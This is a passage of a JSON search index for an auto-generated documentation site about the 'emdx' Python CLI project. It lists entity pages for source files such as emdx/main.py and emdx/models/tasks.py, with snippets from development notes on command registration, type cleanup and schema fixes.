Entities","text":"<ul> <li><code>is_active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>documentgroupwithcounts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>cascademetadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list_groups()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>get_group()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>cascadedocumentlistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>pipelineactivitydict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>list_top_groups_with_counts()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>list_deleted_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>list[groupmember]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/emdxmainpy/","title":"emdx/main.py","text":"<p>Type: heading | Mentioned in: 23 documents | First seen: 2026-01-11</p>"},{"location":"entities/emdxmainpy/#documents-23","title":"Documents (23)","text":"<ul> <li>#6350 Delegate: Rebase the feat/knowledge-decay branch onto main and resolve [2/5]   Section: Conflicts Resolved </li> <li>Issue: Import conflict - main had tags/tasks/trash imports, feature branch had stale/touch imports</li> <li> <p>Resolution: Combined both sets of imports (all imports needed)</p> </li> <li> <p>#6843 Delegate: Fold the stale top-level command into maintain. Move stale l</p> <p>Changes:</p> </li> <li><code>emdx/main.py</code> \u2014 Removed the <code>stale_app</code> import and top-level <code>app.add_typer(stale_app, ...)</code> registration</li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 Added <code>stale_app</code> as a sub-typer u...</p> </li> <li> <p>#6841 Delegate: Add agent-friendly command aliases to reduce agent confusion</p> <p>Changes in <code>emdx/main.py</code>:</p> </li> <li>Added <code>_COMMAND_ALIASES</code> dict mapping <code>\"search\"</code> \u2192 <code>[\"find\"]</code> and <code>\"restore\"</code> \u2192 <code>[\"trash\", \"restore\"]</code></li> <li> <p>Added <code>_rewrite_command_aliases()</code> function that finds...</p> </li> <li> <p>#6607 Delegate: Bug fix: Remove top-level 'epic' and 'cat' CLI commands   Section: What PR #700 Did</p> <p>The commit \"refactor: Nest epic and cat commands under emdx task\" made these changes to <code>emdx/main.py</code>:</p> </li> <li> <p>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</p> </li> </ul>"},{"location":"entities/emdxmainpy/#emdxmainpy_1","title":"emdx/main.py","text":""},{"location":"entities/emdxmainpy/#im","title":"Im","text":"<p>Section: Files Modified</p> <ol> <li><code>emdx/main.py</code> - Registered the wrapup command</li> </ol> <ul> <li>#6545 Delegate Enhancement Gameplans [1/5]   Section: Implementation Checklist <p>...] Create <code>emdx/commands/next.py</code> with decision logic</p> </li> <li>[ ] Import and register in <code>emdx/main.py</code></li> <li>[ ] Write tests in <code>tests/test_next.py</code></li> <li>[ ] Run <code>poetry run ruff check . --fix</code> for lint</li> <li>[ ] Run <code>poetry run pytest tests/test_next.py -x</code> for tests</li> <li> <p>[ ] Man...</p> </li> <li> <p>#6480 Delegate: List the top 5 most important files in the emdx project and    Section: Top 5 Most Important Files in the EMDX Project</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Implementation Details</p> </li> <li>Added to <code>LAZY_SUBCOMMANDS</code> in <code>emdx/main.py</code> under AI features group</li> <li>Only loads AI dependencies when command is actually invoked</li> <li> <p>Shows helpful error message if <code>anthropic</code> package is missing</p> </li> <li> <p>#6451 Implement emdx distill command   Section: Summary</p> <ol> <li><code>emdx/main.py</code> - Registered as a lazy-loaded command</li> </ol> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> </li> <li><code>emdx/services/synthesis_service.py</code> (new)</li> <li><code>emdx/commands/compact.py</code> (new)</li> <li><code>emdx/main.py</code> (added lazy command registration)</li> <li> <p><code>tests/test_compact.py</code> (new)</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Files Changed</p> <ul> <li><code>emdx/commands/briefing.py</code> - New command implementation (340 lines)</li> </ul> </li> <li> <p><code>emdx/main.py</code> - Registered the briefing command</p> </li> <li> <p>#6369 Delegate: Re-implement the Knowledge Decay feature (originally PR #451)   Section: New Commands</p> </li> <li><code>emdx/commands/stale.py</code> - New command module</li> <li><code>emdx/main.py</code> - Register commands</li> <li><code>emdx/commands/prime.py</code> - Integration with prime --verbose</li> <li> <p><code>tests/test_commands_stale.py</code> - 19 tests for the new feature</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...)<code>method | |</code>emdx/config/constants.py<code>| EXTEND | Add</code>COMPACT_*<code>constants | |</code>emdx/main.py<code>| EXTEND | Register command | |</code>tests/test_compact.py` | NEW | Test suite |</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>..., ENV_CLI_TOOL | | <code>emdx/services/cli_executor/factory.py</code> | Use ENV_CLI_TOOL | | <code>emdx/main.py</code> | Use ENV_SAFE_MODE | | <code>emdx/commands/gist.py</code> | Use ENV_GITHUB_TOKEN | | <code>emdx/utils/environment.py</code> | Use ENV_ANTHROPIC_API_KEY, ENV_CURSOR_API_KEY | | `emdx/con...</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 5. Files to Monitor During Upgrade</p> </li> <li> <p><code>emdx/main.py</code> - Main app definition, <code>add_typer</code> calls</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <p>...py` (add get_default_branch())</p> </li> <li><code>emdx/commands/core.py</code> (use DEFAULT_EDITOR)</li> <li> <p><code>emdx/main.py</code> (use BOOL_TRUTHY_VALUES)</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 9. Other Comment References \u2014 COMMENTS ONLY</p> <p>File: <code>emdx/main.py</code></p> </li> <li> <p>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: New Commands</p> </li> <li><code>emdx/commands/stale.py</code> (new) - Stale command implementation</li> <li><code>emdx/commands/touch.py</code> (new) - Touch command implementation</li> <li><code>emdx/commands/prime.py</code> - Added --smart flag</li> <li> <p><code>emdx/main.py</code> - Registered new commands</p> </li> <li> <p>#6140 Delegate: Read gameplan by running: emdx view 6101. Implement the Drea [5/7]   Section: Dream Journal Implementation Complete</p> </li> <li>Created <code>emdx/commands/dream.py</code> \u2014 new command module (~700 lines)</li> <li> <p>Updated <code>emdx/main.py</code> \u2014 registered dream command in CLI</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>.../workflows.py:10 emdx/commands/lifecycle.py:1 emdx/co... [00:03:14] \ud83d\udcc4 Tool result: emdx/main.py:1 emdx/commands/gist.py:1 emdx/commands/tasks.py:1 emdx/commands/export.py:1 emdx/comma... [00:03:14] \ud83d\udcc4 Tool result: bfff863 Merge branch 'main' of https://github.co...</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> </li> <li>emdx/main.py</li> <li>Added <code>distill</code> to <code>LAZY_SUBCOMMANDS</code> (AI features group)</li> <li> <p>Added help string to <code>LAZY_HELP</code></p> </li> <li> <p>#6414 Delegate: Implement 'emdx briefing' command \u2014 a new command that shows   Section: Implemented 'emdx briefing' Command</p> </li> <li>emdx/commands/briefing.py (new) - Main command implementation</li> <li>emdx/main.py - Registered the briefing command</li> </ul>"},{"location":"entities/emdxmainpy/#1-emdxmainpy","title":"1. <code>emdx/main.py</code>","text":"<p>The main CLI entry point that defines the <code>emdx</code> command, registers all subcommands (save, find, view, delegate, cascade, etc.), handles lazy loading for heavy features, and implements safe mode for disabling execution commands.</p>"},{"location":"entities/emdxmainpy/#lazy-loading","title":"Lazy Loading","text":""},{"location":"entities/emdxmainpy/#files-changed","title":"Files Changed","text":""},{"location":"entities/emdxmainpy/#files-changed_1","title":"Files Changed","text":""},{"location":"entities/emdxmainpy/#high-main-cli-entry","title":"High (main CLI entry):","text":""},{"location":"entities/emdxmainpy/#files-changed_2","title":"Files Changed","text":""},{"location":"entities/emdxmainpy/#changes-made","title":"Changes Made","text":""},{"location":"entities/emdxmainpy/#modified-files","title":"Modified Files","text":""},{"location":"entities/emdxmainpy/#files-changed_3","title":"Files Changed","text":""},{"location":"entities/emdxmainpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>~1.75 hours</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>wrapup()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>tests/test_commands_stale.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>tests/test_commands_groups.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>tests/test_cli.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>tasks completed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>raw json output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>quiet mode (just summary)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>preview what would be summarized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/emdxmodelsexecutionspy/","title":"emdx/models/executions.py","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxmodelsexecutionspy/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...imple JSON serialization | | <code>emdx/models/tasks.py</code> | 2 | 2 | TaskDict fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> | 1 | 0 | JSON serialization (keep) | | `emdx/utils/retry.p...</p> </li> <li> <p>#6489 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files</p> <p>Analysis of <code>| None</code> type annotations in <code>emdx/models/tasks.py</code>, <code>emdx/models/executions.py</code>, <code>emdx/models/tags.py</code>, and <code>emdx/models/categories.py</code>.</p> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxmodelsexecutionspy/#synthes-34","title":"Synthes [3/4]","text":"<p><code>emdx/config/ui_config.py</code> \u2014 2 dead functions</p> Function Lines Status <code>get_code_theme()</code> 87-94 Dead \u2014 codebase uses <code>ui/themes.py</code> version instead <code>set_code_theme()</code> 97-106 Dead \u2014 never calle... <ul> <li>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</li> </ul>"},{"location":"entities/emdxmodelsexecutionspy/#im","title":"Im","text":"<p>Section: Files Modified</p> <ol> <li><code>emdx/models/executions.py</code> - Added:</li> <li><code>get_execution_stats_in_window(hours)</code>: Aggregated execution statistics</li> </ol> <ul> <li>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged) <p>...: <code>update_task(task_id: int, **kwargs: Any)</code> - accepts dynamic column updates</p> </li> <li><code>emdx/models/executions.py</code>: <code>update_execution(exec_id: int, **kwargs: Any)</code> - same pattern</li> <li><code>emdx/database/groups.py</code>: <code>update_group(group_id: int, **kwargs: Any)</code> - same pattern</li> <li> <p>**`...</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...1 | JSON output | | <code>emdx/models/tasks.py</code> | 2 | 2 | kwargs + dict pattern | | <code>emdx/models/executions.py</code> | 1 | 1 | kwargs pattern | | <code>emdx/database/groups.py</code> | 2 | 2 | **kwargs pattern | | <code>emdx/utils/output.py</code> | 1 | 1 | JSON serialization | | `emdx/utils/retry.py...</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files [4/7]</p> </li> <li><code>emdx/models/tasks.py</code></li> <li><code>emdx/models/executions.py</code></li> <li><code>emdx/models/tags.py</code></li> <li><code>emdx/models/categories.py</code></li> <li> <p><code>emdx/models/types.py</code> (TypedDict definitions)</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> <p>...new constants</p> </li> <li><code>emdx/utils/environment.py</code> - Uses ENV_* and timeout constants</li> <li> <p><code>emdx/models/executions.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Overview</p> <p>The Execution dataclass in <code>emdx/models/executions.py</code> was missing 6 columns that existed in the database schema, causing a mismatch between the data model and database migrations. Additionally, code was referencing a `...</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...ENV_* constants</p> </li> <li><code>emdx/config/constants.py</code> - Added 104 new lines of constants</li> <li><code>emdx/models/executions.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li><code>emdx/services/ask_service.py</code> - Uses DEFAULT_CLAUDE_FAST_MODEL</li> <li> <p><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEO...</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>File: <code>emdx/models/executions.py</code></p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> </li> <li><code>emdx/models/executions.py</code> - Model sync and query refactor</li> <li><code>emdx/database/migrations.py</code> - Migrations 037, 038, and validator</li> <li> <p><code>emdx/database/groups.py</code> - Security documentation</p> </li> <li> <p>#6246 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [5/37]   Section: Changes Made</p> </li> <li><code>cascade_run_id: Optional[int]</code> - links executions to cascade runs</li> <li> <p><code>task_id: Optional[int]</code> - links executions back to cr...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <ol> <li><code>executions</code> table (via <code>emdx/models/executions.py</code>) - Low-level CLI execution tracking</li> </ol> </li> <li><code>task_executions</code> table (via <code>emdx/models/task_executions.py</code>) - Task-to-execution linking </li> <li> <p><code>tasks</code> table (via `em...</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...emdx/services/execution_monitor.py - Uses STALE_EXECUTION_TIMEOUT_SECONDS</p> </li> <li>emdx/models/executions.py - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> </ul>"},{"location":"entities/emdxmodelsexecutionspy/#files-analyzed","title":"Files Analyzed","text":""},{"location":"entities/emdxmodelsexecutionspy/#problem","title":"Problem","text":"<p>The Execution dataclass in <code>emdx/models/executions.py</code> was missing 6 columns that exist in database migrations:</p>"},{"location":"entities/emdxmodelsexecutionspy/#files-modified","title":"Files Modified","text":""},{"location":"entities/emdxmodelsexecutionspy/#1-added-6-missing-columns-to-execution-dataclass","title":"1. Added 6 Missing Columns to Execution Dataclass","text":"<p>Updated <code>emdx/models/executions.py</code> to add fields from migrations 031/036:</p>"},{"location":"entities/emdxmodelsexecutionspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tokens_used: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>output_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>input_tokens: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>cost_usd: float = 0.0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>update_execution_heartbeat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>get_stale_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>emdx/models/tasks.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>emdx/models/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>~1.75 hours</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>wrapup()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/emdxmodelstagspy/","title":"emdx/models/tags.py","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxmodelstagspy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6489 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files</p> <p>Analysis of <code>| None</code> type annotations in <code>emdx/models/tasks.py</code>, <code>emdx/models/executions.py</code>, <code>emdx/models/tags.py</code>, and <code>emdx/models/categories.py</code>.</p> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxmodelstagspy/#synthes-34","title":"Synthes [3/4]","text":"<p><code>emdx/models/executions.py</code> \u2014 2 dead functions (test-only)</p> Function Lines Production usage Test usage <code>update_execution_working_dir()</code> 303-314 None \u2014 superseded by generic `upda... <ul> <li>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made </li> <li><code>emdx/models/tags.py</code> \u2014 Removed expand_aliases calls, normalize_tag_to_emoji calls, dedup logic</li> <li><code>emdx/commands/core.py</code> \u2014 Removed expand_alias_string import and calls</li> <li> <p>`emdx/services/...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 2. <code>expand_aliases</code> (function)</p> <p>... | | <code>emdx/utils/emoji_aliases.py</code> | 172 | Called by <code>expand_alias_string()</code> | | <code>emdx/models/tags.py</code> | 9 | Import: <code>from emdx.utils.emoji_aliases import expand_aliases, normalize_tag_to_emoji</code> | | <code>emdx/models/tags.py</code> | 40 | Usage*: `expanded_tags = expand_...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Implementation Plan</p> <p>...e <code>emdx/utils/emoji_aliases.py</code></p> </li> <li>Delete <code>tests/test_emoji_aliases.py</code></li> <li>Update <code>emdx/models/tags.py</code> \u2014 remove all <code>expand_aliases()</code> and <code>normalize_tag_to_emoji()</code> calls</li> <li>Update <code>emdx/commands/core.py</code> \u2014 remove <code>expand_alias_string()</code> calls</li> <li> <p>Update `emdx/servic...</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files [4/7]</p> </li> <li><code>emdx/models/tasks.py</code></li> <li><code>emdx/models/executions.py</code></li> <li><code>emdx/models/tags.py</code></li> <li><code>emdx/models/categories.py</code></li> <li> <p><code>emdx/models/types.py</code> (TypedDict definitions)</p> </li> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> <p>...MODIFIED: <code>emdx/models/categories.py</code> - 2 functions updated  </p> </li> <li> <p>MODIFIED: <code>emdx/models/tags.py</code> - 2 functions updated</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> <p>...| 8 functions | Medium | | <code>emdx/models/categories.py</code> | 2 functions | Medium | | <code>emdx/models/tags.py</code> | 2 functions | Medium | | <code>emdx/database/search.py</code> | 1 function | Low |</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...o happen before commit (SQLite requirement)</p> </li> <li> <p>Updated <code>add_tags_to_document()</code> in <code>emdx/models/tags.py</code> to accept optional connection parameter</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 9. Other Comment References \u2014 COMMENTS ONLY</p> <p>File: <code>emdx/models/tags.py</code></p> </li> <li> <p>#6440 Remove unused kwargs and tighten SQL param types   Section: Changes Made</p> <p>...ady_tasks** \u2014 Changed <code>params: list[Any]</code> to <code>params: list[str | int | None]</code></p> </li> <li>emdx/models/tags.py:search_by_tags \u2014 Changed <code>params: list[Any]</code> to <code>params: list[str | int | None]</code></li> <li>emdx/database/documents.py:list_documents \u2014 Changed <code>params: list[Any]</code> to...</li> </ul>"},{"location":"entities/emdxmodelstagspy/#phase-3-consumer-updates","title":"Phase 3: Consumer Updates","text":""},{"location":"entities/emdxmodelstagspy/#files-analyzed","title":"Files Analyzed","text":""},{"location":"entities/emdxmodelstagspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/models/categories.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>summary completed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>phase 1: database migration</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>list_all_tags()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>\ud83d\udfe2\u2192active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>testsuggestaliases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tests/test_models_tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>testreversealiases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>testnormalizetagtoemoji</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>testistextalias</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxmodelstaskspy/","title":"emdx/models/tasks.py","text":"<p>Type: heading | Mentioned in: 21 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxmodelstaskspy/#documents-21","title":"Documents (21)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...urn is fine | | <code>emdx/commands/review.py</code> | 2 | 2 | Simple JSON serialization | | <code>emdx/models/tasks.py</code> | 2 | 2 | TaskDict fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> |...</p> </li> <li> <p>#6489 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files</p> <p>Analysis of <code>| None</code> type annotations in <code>emdx/models/tasks.py</code>, <code>emdx/models/executions.py</code>, <code>emdx/models/tags.py</code>, and <code>emdx/models/categories.py</code>.</p> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxmodelstaskspy/#synthes-34","title":"Synthes [3/4]","text":"<p><code>emdx/models/tags.py</code> \u2014 1 dead function (test-only)</p> Function Lines Production usage Test usage <code>get_tag_suggestions()</code> 397-413 None <code>test_models_tags.py</code> only"},{"location":"entities/emdxmodelstaskspy/#7","title":"7. `...","text":"<ul> <li>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</li> </ul>"},{"location":"entities/emdxmodelstaskspy/#im","title":"Im","text":"<p>Section: Files Modified</p> <ol> <li><code>emdx/models/tasks.py</code> - Added data query functions:</li> <li><code>get_tasks_in_window(hours)</code>: Non-delegate tasks updated in window</li> <li><code>get_delegate_tasks_in_window(hours)</code>: Top-level delegate tasks in window</li> </ol> <ul> <li>#6554 Implementation: Add Recent Failures to emdx prime (Issue #FEAT-7)   Section: Changes Made </li> <li>Queries failed tasks from the last N hours (default: 24)</li> <li> <p>Filters for delegate ta...</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: Files to Modify</p> File Function Changes <code>emdx/models/tasks.py</code> Add new function <code>get_recent_failures()</code> \u2014 query failed tasks from last 24h <code>emdx/commands/prime.py</code> <code>_output_text()</code> Add RECENT FAILURES section `e... </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged)</p> <p>..., <code>_safe_update_task</code>, <code>_safe_update_execution</code> - forwards to typed functions</p> </li> <li><code>emdx/models/tasks.py</code>: <code>update_task(task_id: int, **kwargs: Any)</code> - accepts dynamic column updates</li> <li> <p><code>emdx/models/executions.py</code>: <code>update_execution(exec_id: int, **kwargs: Any)</code> -...</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...ence enum + dict patterns | | <code>emdx/commands/review.py</code> | 1 | 1 | JSON output | | <code>emdx/models/tasks.py</code> | 2 | 2 | kwargs + dict pattern | | <code>emdx/models/executions.py</code> | 1 | 1 | kwargs pattern | | <code>emdx/database/groups.py</code> | 2 | 2 | **kwargs pattern | | `emdx/util...</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files [4/7]</p> </li> <li><code>emdx/models/tasks.py</code></li> <li><code>emdx/models/executions.py</code></li> <li><code>emdx/models/tags.py</code></li> <li><code>emdx/models/categories.py</code></li> <li> 